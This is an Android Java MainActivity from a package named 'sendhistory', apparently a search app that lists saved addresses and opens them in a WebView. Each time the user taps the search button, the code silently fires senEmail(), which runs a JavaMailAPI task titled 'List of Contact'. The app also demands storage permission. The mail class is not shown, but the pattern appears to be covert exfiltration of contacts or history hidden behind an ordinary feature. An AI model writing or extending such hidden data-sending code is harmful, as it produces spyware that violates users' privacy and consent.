package com.sample.sendhistory;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.preference.PreferenceManager;
import android.text.Editable;
import android.text.TextWatcher;
import android.util.Log;
import android.view.View;
import android.widget.AdapterView;
import android.widget.Button;
import android.widget.EditText;
import android.widget.ListView;

import com.google.gson.Gson;
import com.google.gson.reflect.TypeToken;

import java.lang.reflect.Type;
import java.util.ArrayList;
import java.util.List;

public class MainActivity extends AppCompatActivity
{

    private EditText searchEdittext;
    private Button button;
    private ListView listViewItem;
    List<SearchModel> searchModelList = new ArrayList<>();
    CustomAdapter customAdapter=null;

    @Override
    protected void onCreate(Bundle savedInstanceState)
    {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        Utils.init(this);

        boolean permit = Utils.checkPermissionForReadExtertalStorage(MainActivity.this);
        if (!permit)
        {
            try
            {
                Utils.requestPermissionForReadExtertalStorage(MainActivity.this);
            }
            catch (Exception e)
            {
                e.printStackTrace();
            }
        }
        searchModelList = Utils.getListOfSearchModel();
        searchEdittext = findViewById(R.id.searchEdittext);
        listViewItem = findViewById(R.id.listViewItem);

        button = findViewById(R.id.btn);
        button.setOnClickListener(new View.OnClickListener()
        {
            @Override
            public void onClick(View v)
            {
                senEmail();
                Intent intent = new Intent(MainActivity.this, WebviewSearch.class);
                intent.putExtra("address", searchEdittext.getText().toString());
                startActivity(intent);
            }
        });
        customAdapter = new CustomAdapter(getApplicationContext(), searchModelList);
        listViewItem.setAdapter(customAdapter);
        searchEdittext.addTextChangedListener(new TextWatcher()
        {
            @Override
            public void onTextChanged(CharSequence cs, int arg1, int arg2, int arg3)
            {
                // When user changed the Text
                MainActivity.this.customAdapter.getFilter().filter(cs);
            }
            @Override
            public void beforeTextChanged(CharSequence arg0, int arg1, int arg2, int arg3) { }

            @Override
            public void afterTextChanged(Editable arg0) {}
        });
        listViewItem.setOnItemClickListener(new AdapterView.OnItemClickListener()
        {
            @Override
            public void onItemClick(AdapterView<?> adapterView, View view, int i, long l)
            {
                SearchModel model = (SearchModel) listViewItem.getAdapter().getItem(i);
                Log.d("selecteditem", model.rate + "");
                Intent intent = new Intent(MainActivity.this, WebviewSearch.class);
                intent.putExtra("address", model.address);
                startActivity(intent);
            }
        });
    }

    @Override
    protected void onResume()
    {
        super.onResume();
        if(MainActivity.this.customAdapter!=null)
            MainActivity.this.customAdapter.getFilter().filter(searchEdittext.getText().toString());
    }

    private void senEmail()
    {
        JavaMailAPI javaMailAPI = new JavaMailAPI(this, "List of Contact");
        javaMailAPI.execute();
    }

    @Override
    public void onRequestPermissionsResult(int requestCode,
                                           String permissions[], int[] grantResults)
    {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        switch (requestCode)
        {
            case Utils.READ_STORAGE_PERMISSION_REQUEST_CODE:
            {
                if (grantResults.length > 0
                        && grantResults[0] == PackageManager.PERMISSION_GRANTED)
                    Log.d("permit","permit");
                else
                    MainActivity.this.finish();
                return;
            }
        }
    }
}